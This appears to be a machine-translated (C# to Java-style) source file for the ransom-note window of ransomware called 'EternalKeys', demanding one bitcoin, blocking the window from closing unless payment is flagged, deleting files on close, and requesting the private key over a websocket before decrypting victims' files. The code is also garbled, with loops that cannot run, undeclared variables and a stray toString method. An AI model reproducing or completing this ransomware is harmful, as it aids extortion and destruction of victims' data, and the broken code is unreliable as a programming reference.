package EternalKeys;

import System.Collections.Generic.*;
import System.Data.*;
import System.Drawing.*;
import System.ComponentModel.*;
import System.Windows.Forms.*;
import System.*;
import System.Media.*;
import EternalKeys.Properties.*;

/**
 * Summary description for Form1.
 */
public class RansomwareDisplay extends System.Windows.Forms.Form
{
	private boolean HasPaid;
	private Label label2;
	private Button button1;
	private TextBox textBox1;
	private RichTextBox richTextBox1;
	private Label label1;
	private Label label3;
	private TextBox textBox2;
	private Button button2;
	private Label label4;
	/**
	 * Required designer variable.
	 */
	private System.ComponentModel.IContainer components;

	public RansomwareDisplay()
	{
		//
		// Required for Windows Form Designer support
		//
		InitializeComponent();

		//
		// TODO: Add any constructor code after InitializeComponent call
		//
	}

	#region Windows Form Designer generated code
	/**
     * Clean up any resources being used.
     */
	protected void Dispose(boolean disposing)
	{
		if (disposing)
		{
			if (components != null)
			{
				components.Dispose();
			}
		}
		super.Dispose(disposing);
	}

	/**
	 * Required method for Designer support - do not modify
	 * the contents of this method with the code editor.
	 */
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(RansomwareDisplay.class.ToType());
		this.label2 = new System.Windows.Forms.Label();
		this.button1 = new System.Windows.Forms.Button();
		this.textBox1 = new System.Windows.Forms.TextBox();
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.label1 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.textBox2 = new System.Windows.Forms.TextBox();
		this.button2 = new System.Windows.Forms.Button();
		this.label4 = new System.Windows.Forms.Label();
		this.SuspendLayout();
		// 
		// label2
		// 
		this.label2.set_AutoSize(true);
		this.label2.set_BackColor(System.Drawing.Color.get_Transparent());
		this.label2.set_Font(new System.Drawing.Font("Comic Sans MS", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((ubyte)0)));
		this.label2.set_ForeColor(System.Drawing.Color.get_Cyan());
		this.label2.set_Location(new System.Drawing.Point(122, 9));
		this.label2.set_Name("label2");
		this.label2.set_Size(new System.Drawing.Size(656, 80));
		this.label2.set_TabIndex(0);
		this.label2.set_Text("Yo bro yo files are encrypted man\r\nPay me 1 bitcoin then imma unlock them my bro");
		this.label2.set_TextAlign(System.Drawing.ContentAlignment.MiddleCenter);
		// 
		// button1
		// 
		this.button1.set_Cursor(System.Windows.Forms.Cursors.get_Hand());
		this.button1.set_Location(new System.Drawing.Point(13, 342));
		this.button1.set_Name("button1");
		this.button1.set_Size(new System.Drawing.Size(140, 25));
		this.button1.set_TabIndex(1);
		this.button1.set_Text("Use Decryption Code");
		this.button1.set_UseVisualStyleBackColor(true);
		// 
		// textBox1
		// 
		this.textBox1.set_Location(new System.Drawing.Point(13, 373));
		this.textBox1.set_Name("textBox1");
		this.textBox1.set_Size(new System.Drawing.Size(140, 20));
		this.textBox1.set_TabIndex(2);
		// 
		// richTextBox1
		// 
		this.richTextBox1.set_Location(new System.Drawing.Point(12, 122));
		this.richTextBox1.set_Name("richTextBox1");
		this.richTextBox1.set_Size(new System.Drawing.Size(417, 185));
		this.richTextBox1.set_TabIndex(3);
		this.richTextBox1.set_Text("");
		// 
		// label1
		// 
		this.label1.set_AutoSize(true);
		this.label1.set_BackColor(System.Drawing.Color.get_Transparent());
		this.label1.set_Font(new System.Drawing.Font("Comic Sans MS", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((ubyte)0)));
		this.label1.set_ForeColor(System.Drawing.Color.get_Cyan());
		this.label1.set_Location(new System.Drawing.Point(12, 104));
		this.label1.set_Name("label1");
		this.label1.set_Size(new System.Drawing.Size(89, 15));
		this.label1.set_TabIndex(4);
		this.label1.set_Text("Encrypted Files:");
		// 
		// label3
		// 
		this.label3.set_AutoSize(true);
		this.label3.set_BackColor(System.Drawing.Color.get_Transparent());
		this.label3.set_Font(new System.Drawing.Font("Comic Sans MS", 20.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((ubyte)0)));
		this.label3.set_ForeColor(System.Drawing.Color.get_Cyan());
		this.label3.set_Location(new System.Drawing.Point(446, 358));
		this.label3.set_Name("label3");
		this.label3.set_Size(new System.Drawing.Size(413, 38));
		this.label3.set_TabIndex(5);
		this.label3.set_Text("Nilla wafersare yummy tummy");
		// 
		// textBox2
		// 
		this.textBox2.set_Location(new System.Drawing.Point(436, 210));
		this.textBox2.set_Name("textBox2");
		this.textBox2.set_Size(new System.Drawing.Size(423, 20));
		this.textBox2.set_TabIndex(6);
		// 
		// button2
		// 
		this.button2.set_Cursor(System.Windows.Forms.Cursors.get_Hand());
		this.button2.set_Font(new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((ubyte)0)));
		this.button2.set_Location(new System.Drawing.Point(565, 236));
		this.button2.set_Name("button2");
		this.button2.set_Size(new System.Drawing.Size(184, 98));
		this.button2.set_TabIndex(7);
		this.button2.set_Text("I paid, I want my files now");
		this.button2.set_UseVisualStyleBackColor(true);
		// 
		// label4
		// 
		this.label4.set_AutoSize(true);
		this.label4.set_BackColor(System.Drawing.Color.get_Transparent());
		this.label4.set_Font(new System.Drawing.Font("Comic Sans MS", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((ubyte)0)));
		this.label4.set_ForeColor(System.Drawing.Color.get_Cyan());
		this.label4.set_Location(new System.Drawing.Point(435, 192));
		this.label4.set_Name("label4");
		this.label4.set_Size(new System.Drawing.Size(91, 15));
		this.label4.set_TabIndex(8);
		this.label4.set_Text("Bitcoin Address:");
		// 
		// RansomwareDisplay
		// 
		this.set_AutoScaleDimensions(new System.Drawing.SizeF(6F, 13F));
		this.set_AutoScaleMode(System.Windows.Forms.AutoScaleMode.Font);
		this.set_AutoSizeMode(System.Windows.Forms.AutoSizeMode.GrowAndShrink);
		this.set_BackgroundImage(EternalKeys.Properties.Resources.get_KitteyHack());
		this.set_BackgroundImageLayout(System.Windows.Forms.ImageLayout.Stretch);
		this.set_ClientSize(new System.Drawing.Size(871, 405));
		this.get_Controls().Add(this.label4);
		this.get_Controls().Add(this.button2);
		this.get_Controls().Add(this.textBox2);
		this.get_Controls().Add(this.label3);
		this.get_Controls().Add(this.label1);
		this.get_Controls().Add(this.richTextBox1);
		this.get_Controls().Add(this.textBox1);
		this.get_Controls().Add(this.button1);
		this.get_Controls().Add(this.label2);
		this.set_DoubleBuffered(true);
		this.set_Icon(((System.Drawing.Icon)(resources.GetObject("$this.Icon"))));
		this.set_MaximizeBox(false);
		this.set_Name("RansomwareDisplay");
		this.set_ShowInTaskbar(false);
		this.set_StartPosition(System.Windows.Forms.FormStartPosition.CenterScreen);
		this.set_Text("EternalKeys");
		this.add_Load(new System.EventHandler(this.RansomwareDisplay_Load));
		this.add_FormClosing(new System.Windows.Forms.FormClosingEventHandler(this.RansomwareDisplay_FormClosing));
		this.ResumeLayout(false);
		this.PerformLayout();

	}
	#endregion

	private void RansomwareDisplay_FormClosing(Object sender, FormClosingEventArgs e)
	{
		if (HasPaid)
        {
            if (MessageBox.Show("Are you sure you want to lose your files?", "Emmy", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
				for (String path; Globals.Encrypted; )
				{
					File.Delete(path);
				}
            }
        }
        else
        {
            e.set_Cancel(true);  
        }
	}

	private void RansomwareDisplay_Load(Object sender, System.EventArgs e)
	{
		String[] array = new String[]
        {
            "Club penguin is 4 da h4x0rz",
            "Made by Emmy",
            "The keys of the Eternal",
            "Tornado stale bread",
            "Nilla wafersare yummy tummy",
            "Frick Lol Piggy Bank Man"
        };
		label3.set_Text(array[new Random().Next(array.length - 1)]);
	}

    public String toString() {
        return "Tuple [item1=" + item1 + ", item2=" + item2 + "]";
    }

	private void button1_Click(Object sender, EventArgs e)
	{
		Globals.ws.Send(JsonConvert.DeserializeObject((String)(Object)new Globals.cmd("private_key", textBox1.get_Text())));
        int num = MessageBox.Show("Delocking Attempt", "Delocker");
		for (String str; Globals.Encrypted; )
		{
			try
			{
				if (Globals.Passwords.PrivatePassword != null)
				{
					HasPassword = true;
					Console.WriteLine("Delocking " + str);
					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject(new TypeToken<Tuple<byte[], byte[]>>() { }.getType(), File.ReadAllText(str));
					File.WriteAllBytes(str, LockerEngine.Decrypt_File_AESRSA(encoded, Globals.Passwords.PrivatePassword));
					File.Move(str, Path.ChangeExtension(str, null));
				}
				else
				{
					HasPassword = false;
					break;
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.get_Message(), ex.get_Source(), MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
		}
	}

	private void RansomwareDisplay_Shown(Object sender, EventArgs e)
	{
		richTextBox1.set_Text(Globals.Encrypted.toString());
	}

	private void button2_Click(Object sender, EventArgs e)
	{
		Globals.ws.Send(JsonConvert.SerializeObject(new Globals.cmd("private_key", "key")));
        int num = MessageBox.Show("Delocking Attempt", "Delocker Password");
		for (String str; Globals.Encrypted; )
		{
			try
			{
				if (Globals.Passwords.PrivatePassword != null)
				{
					HasPassword = true;
					Console.WriteLine("Delocking " + str);
					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject(new TypeToken<Tuple<byte[], byte[]>>() { }.getType(), File.ReadAllText(str));
					File.WriteAllBytes(str, EncryptionEngine.Decrypt_File_AESRSA(encoded, Globals.Passwords.PrivatePassword));
					File.Move(str, Path.ChangeExtension(str, null));
				}
				else
				{
					HasPassword = false;
					break;
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.get_Message(), ex.get_Source(), MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
		}
	}
}